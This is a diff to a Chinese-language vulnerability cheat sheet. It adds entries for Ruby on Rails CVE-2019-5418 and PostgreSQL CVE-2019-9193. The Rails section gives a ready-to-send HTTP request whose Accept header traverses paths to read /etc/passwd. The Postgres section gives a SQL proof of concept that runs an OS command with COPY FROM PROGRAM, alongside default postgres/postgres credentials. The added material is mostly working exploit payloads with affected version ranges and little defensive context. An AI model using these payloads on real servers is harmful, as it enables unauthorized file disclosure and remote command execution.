@@ -6,13 +6,19 @@
         - [ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞](#ThinkPHP5-5.0.22/5.1.29-远程代码执行漏洞)
         - [ThinkPHP-5.0.23-Rce](#ThinkPHP-5.0.23-Rce)
         - [ThinkPHP-2.x-任意代码执行漏洞](#ThinkPHP-2.x-任意代码执行漏洞)
+    - [phpmyadmin](#phpmyadmin)
 - [Python](#Python)
     - [Flask](#Flask)
         - [Jinja2](#Jinja2)
 - [Struts2](#Struts2)
     - [s2-013](#s2-013)
     - [s2-045](#s2-045)
-
+- [Ruby](#Ruby)
+    - [Rails](#Rails)
+        - [CVE-2019-5418](#CVE-2019-5418)
+- [数据库](#数据库)
+    - [Postgres](#Postgres)
+        - [CVE-2019-9193](#CVE-2019-9193)
 ## PHP
 
 ### XXE
@@ -92,3 +98,48 @@ id:
 
 ### s2-013
 ### s2-045
+
+
+## Ruby
+
+### Rails
+
+Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。
+
+#### CVE-2019-5418
+
+漏洞影响：
+Ruby on Rails < 6.0.0.beta3
+Ruby on Rails < 5.2.2.1
+Ruby on Rails < 5.1.6.2
+Ruby on Rails < 5.0.7.2
+
+```
+GET /robots HTTP/1.1
+Host: your-ip:3000
+Accept-Encoding: gzip, deflate
+Accept: ../../../../../../../../etc/passwd{{
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+```
+
+![image](./img/1.png)
+## 数据库
+
+### Postgres
+
+#### CVE-2019-9193
+
+Navicat连接数据库，数据库初始账号密码为postgres/postgres
+
+影响版本：PostgreSQL 9.3-11.2
+poc
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+
+![image](./img/postgres1.png)
